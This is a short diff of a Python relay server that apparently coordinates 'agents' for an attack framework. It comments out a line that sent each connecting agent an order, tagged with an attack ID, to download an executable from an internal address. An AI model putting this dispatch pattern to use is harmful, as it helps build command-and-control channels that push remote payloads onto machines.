@@ -50,7 +50,9 @@ class RelayServer(object):
 
         elif client_type == "agent":
             self.agents.add(sock)
-            sock.send(bson.dumps({"type" : "endpoint","attack_id" : 13,"download": "http://172.30.1.39:8000/12.exe","filename": "12.exe","ticket": 3}))
+            # for debug
+            # sock.send(bson.dumps({"type" : "endpoint","attack_id" : 13,
+            # "download": "http://172.30.1.39:8000/12.exe","filename": "12.exe","ticket": 3}))
         
         elif client_type == "tmp":
             self.tmps[fd_num] = sock
